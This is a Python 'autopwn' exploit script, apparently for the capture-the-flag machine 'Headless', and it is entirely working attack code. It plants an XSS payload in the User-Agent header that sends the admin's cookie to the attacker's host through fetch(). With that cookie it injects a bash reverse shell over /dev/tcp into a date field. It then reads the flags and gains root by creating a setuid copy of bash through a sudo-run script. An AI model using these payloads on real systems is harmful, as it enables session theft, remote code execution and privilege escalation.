import argparse
import requests
import sys

from pwn import log, listen
from multiprocessing import Process


TARGET_SITE_PORT=5000
XSS_VULNERABLE_ENDPOINT='/support'
BASH_INJECTION_VULNERABLE_ENDPOINT='/dashboard'
SSH_PORT=22

class HeadlessAutopwn:

    def __init__(self, lhost, lport, rhost, srvport):
        self.lhost = lhost
        self.lport = lport
        self.rhost = rhost
        self.srvport = srvport
        self.admin_cookie = ''

    def _generate_xss_payload(self):
        log.info('generating XSS payload')
        return f'<img src=x onerror=fetch("http://{self.lhost}:{self.srvport}/evil.jpg?c="+document.cookie);>'

    def _generate_bash_payload(self):
        log.info('generating Bash payload')
        return f'/bin/bash -c "bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"'

    def _send_xss_payload(self):
        headers = {
            'user-agent': self._generate_xss_payload(),
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        '''
            This data triggers the "Hacking Attempt Detected" response which 
            prints information from the headers in an html that comes from the 
            backend, enabling XSS.

            This data resembles this payload: fname=test&lname=test&email=test%40test.com&phone=test&message=%3C%3E
        '''
        trigger_data = {
            'fname': 'test',
            'lname': 'test',
            'email': 'test@test.com',
            'phone': 'test',
            'message': '<>' # Notice this is the field that enables XSS
        }

        log.info('Sending XSS payload')

        requests.post(f'http://{self.rhost}:{TARGET_SITE_PORT}{XSS_VULNERABLE_ENDPOINT}', headers=headers, data=trigger_data)
    
    def _capture_admin_cookie(self):
        log.info('Listening for a connection... It might take a while.')

        with listen(self.srvport).wait_for_connection() as xss_response:
            raw_response = str(xss_response.recv(), 'utf-8')
            self.admin_cookie = raw_response.split(' ', 2)[1].replace('/evil.jpg?c=is_admin=', '')

            if 'is_admin=' in raw_response:
                log.success(f'Admin cookie grabbed!: {self.admin_cookie}')
            else:
                log.error(f'Something went wrong went grabbing admin cookie. Check original response: {raw_response}')
                sys.exit(1)

    def _send_bash_payload(self):
        log.info('Now sending Bash payload')

        cookies = {
            'is_admin': self.admin_cookie
        }

        data = {
            'date': f'2023-09-15;{self._generate_bash_payload()}'
        }

        requests.post(f'http://{self.rhost}:{TARGET_SITE_PORT}{BASH_INJECTION_VULNERABLE_ENDPOINT}', data=data, cookies=cookies)

    def _dump_shell_lines(self, shell, n_of_lines):
        for _ in range(n_of_lines):
            shell.recvline()


    def run(self):
        # XSS Exploitation
        self._send_xss_payload()
        self._capture_admin_cookie()

        # Pwning dvir
        try:
            bash_request = Process(target=self._send_bash_payload)
            bash_request.start()
        except Exception as e:
            log.error('There was an issue with bash payload request.')


        with listen(self.lport) as shell:
            if shell.wait_for_connection():
                # User Flag
                log.success('Successful shell connection!')

                self._dump_shell_lines(shell, 2)

                log.info('Seeking user flag...')

                shell.sendline(b'cd /home/dvir')
                shell.sendline(b'cat user.txt')

                self._dump_shell_lines(shell, 2)

                user_flag = str(shell.recvline(), 'utf-8').replace('\n', '')
                
                log.success(f'User flag found! -> {user_flag}')

                # Root Flag
                log.info('Exploiting shell script executable as root...')

                shell.sendline(b'cd /tmp')
                shell.sendline(b"""echo '#!/bin/bash\ncp /bin/bash /tmp/dani\nchmod 4777 /tmp/dani' > initdb.sh""")
                shell.sendline(b'chmod 777 /tmp/initdb.sh')
                shell.sendline(b'sudo /usr/bin/syscheck')
                shell.sendline(b'/tmp/dani -p')
                shell.sendline(b'whoami')

                self._dump_shell_lines(shell, 11)

                is_root = str(shell.recvline(), 'utf-8').replace('\n', '') == 'root'

                if(is_root):
                    log.success('Root access obtained!')
                else:
                    log.error('Exploit Failed. Reason: Root access could not be obtained.')
                
                log.success('Seeking root flag...')

                shell.sendline(b'cd /root')
                shell.sendline(b'cat root.txt')

                root_flag = str(shell.recvline(), 'utf-8')

                log.success(f'Root flag found! -> {root_flag}')


if __name__ == '__main__':
    argparser = argparse.ArgumentParser(
                            prog='HeadlessAutopwn',
                            description='Headless autopwn. It will grab both flags in the machine by exploiting XSS and a vulnerable shell script.',
                            epilog='Example: python3 headless_autopwn -l 10.10.16.80 -p 4444 -r 10.129.240.234 -s 80')

    argparser.add_argument('-l', '--lhost', type=str, required=True, help='Local host used to connect to the machine')
    argparser.add_argument('-p', '--lport', type=int, required=True, help='Local port used to connect to the machine')
    argparser.add_argument('-r', '--rhost', type=str, required=True, help='Remote, target host')
    argparser.add_argument('-s', '--srvport', type=int, required=True, help='Local server port to receive XSS response')

    args = argparser.parse_args()

    HeadlessAutopwn(args.lhost, args.lport, args.rhost, args.srvport).run()
